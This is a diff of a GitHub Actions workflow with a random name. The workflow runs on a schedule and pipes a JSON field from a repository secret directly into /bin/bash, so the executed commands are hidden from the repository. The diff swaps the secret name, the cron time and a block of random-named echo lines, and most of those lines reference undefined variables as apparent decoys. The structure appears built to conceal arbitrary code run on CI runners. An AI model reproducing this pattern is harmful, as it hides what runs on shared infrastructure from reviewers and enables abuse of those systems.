@@ -1,26 +1,28 @@
 name: pangxifeng5678
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
+    - cron: '58 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pangxifeng5678
         env:
-          ojhxh0093: ${{ secrets.ojhxh0093 }}
+          hw3269: ${{ secrets.hw3269 }}
         run: |
-          echo $ojhxh0093 | jq -r .igvza1409 | /bin/bash
-          echo $hfu5 | jq -r .gd3172 | /bin/bash
-          echo $zeoxs883 | jq -r .wbmbj76463 | /bin/bash
-          echo $wksde32 | jq -r .bz175 | /bin/bash
-          echo $vmrr00 | jq -r .ezvuh93 | /bin/bash
-          echo $xr840 | jq -r .o1745 | /bin/bash
-          echo $m1051 | jq -r .tetc28895 | /bin/bash
-          echo $z27 | jq -r .mao70015 | /bin/bash
-          echo $le3146 | jq -r .hwruz21 | /bin/bash
-          echo $itei0 | jq -r .tyqu2753 | /bin/bash
+          echo $hw3269 | jq -r .ok8 | /bin/bash
+          echo $vbwlg972 | jq -r .vdngp69744 | /bin/bash
+          echo $orwqg64 | jq -r .hsjib17188 | /bin/bash
+          echo $ifo108 | jq -r .q3 | /bin/bash
+          echo $neuzq114 | jq -r .ikxz8 | /bin/bash
+          echo $y12532 | jq -r .jhh795 | /bin/bash
+          echo $zcc987 | jq -r .em9 | /bin/bash
+          echo $mkx500 | jq -r .dhkjj147 | /bin/bash
+          echo $uv2783 | jq -r .zjjep95 | /bin/bash
+          echo $y3 | jq -r .p6 | /bin/bash
+          echo $iqyq90637 | jq -r .go76 | /bin/bash
 
